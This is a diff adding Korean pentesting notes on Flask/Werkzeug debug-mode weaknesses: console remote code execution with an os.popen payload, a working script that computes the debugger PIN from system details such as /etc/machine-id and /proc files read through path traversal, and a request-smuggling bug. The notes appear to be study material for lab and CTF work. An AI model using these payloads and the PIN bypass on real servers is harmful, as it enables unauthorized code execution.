@@ -1817,3 +1817,114 @@ php magescan.phar scan:all swagshop.htb
 
 
 </details>
+
+---
+<details>
+	<summary><strong>Werkzeug / Flask 디버그 취약점</strong></summary>
+
+- https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/werkzeug.html
+- Flask가 `debug=True` 상태로 외부에 노출됐을 때 발생하는 취약점.
+<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/8acb8e9a-e4a8-4057-ae49-5d3f7d4b5970" />
+
+<br>
+<br>
+
+<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/b21bbd4a-f50b-4610-bcf2-bd2715e43732" />
+
+## 공격 벡터
+
+### 1. Console RCE (원격 코드 실행)
+
+**조건**
+- 디버그 모드 ON
+- `/console` 경로가 외부에 노출된 상태
+
+**공격 방법**
+
+브라우저에서 `http://target/console` 접속 후 Python 코드 직접 입력:
+
+```python
+__import__('os').popen('whoami').read()
+```
+
+---
+
+### 2. PIN 우회 (Path Traversal 연계)
+
+**조건**
+- 디버그 모드 ON + PIN 보호 활성화
+- **파일 읽기 취약점(Path Traversal)** 존재
+
+**배경**  
+PIN이 걸려 있어도 Werkzeug의 PIN 생성 알고리즘(`__init__.py`)을 역산하면 PIN을 직접 계산할 수 있다.
+
+**필요한 정보 수집**
+
+| 분류 | 항목 | 수집 경로 |
+|------|------|-----------|
+| 공개 정보 | 서버 실행 유저명 | 스택 트레이스 or `/etc/passwd` or `/proc/self/environ` |
+| 공개 정보 | `app.py` 전체 경로 | 스택 트레이스에서 노출됨 |
+| 비공개 정보 | MAC 주소 | `/proc/net/arp`, `/sys/class/net/<iface>/address` |
+| 비공개 정보 | 머신 ID | `/etc/machine-id` or `/proc/sys/kernel/random/boot_id` |
+| 비공개 정보 | cgroup 정보 | `/proc/self/cgroup` |
+
+**PIN 계산 스크립트**
+
+```python
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+    'web3_user',        # username
+    'flask.app',        # modname
+    'Flask',            # app.__name__(Gunicorn - wsgi_app)
+    '/usr/local/lib/python3.5/dist-packages/flask/app.py'  # app.py 경로
+]
+
+private_bits = [
+    '279275995014060',               # MAC 주소 (10진수)
+    'd4e6cb65d59544f3331ea0425dc555a1'  # machine-id
+]
+
+# Werkzeug 2.0.0 이상: sha1 / 이하: md5
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+
+cookie_name = '__wzd' + h.hexdigest()[:20]
+
+h.update(b'pinsalt')
+num = ('%09d' % int(h.hexdigest(), 16))[:9]
+
+for group_size in 5, 4, 3:
+    if len(num) % group_size == 0:
+        rv = '-'.join(num[x:x + group_size] for x in range(0, len(num), group_size))
+        break
+
+print(rv)  # 계산된 PIN 출력
+```
+
+> 💡 구버전 Werkzeug는 `sha1` 대신 `md5` 사용
+
+---
+
+### 3. Unicode Request Smuggling
+
+
+**조건**
+- Werkzeug의 Unicode 헤더 처리 버그
+- `Connection: keep-alive` 헤더 사용
+
+**원리**  
+Werkzeug가 헤더에 Unicode 문자가 포함된 요청을 정상적으로 종료하지 않아, 요청 본문(body)이 **다음 HTTP 요청으로 해석**되는 CL.0 Request Smuggling 취약점 발생.
+
+**참고:** [Werkzeug Issue #2833](https://github.com/pallets/werkzeug/issues/2833)
+
+
+	
+</details>
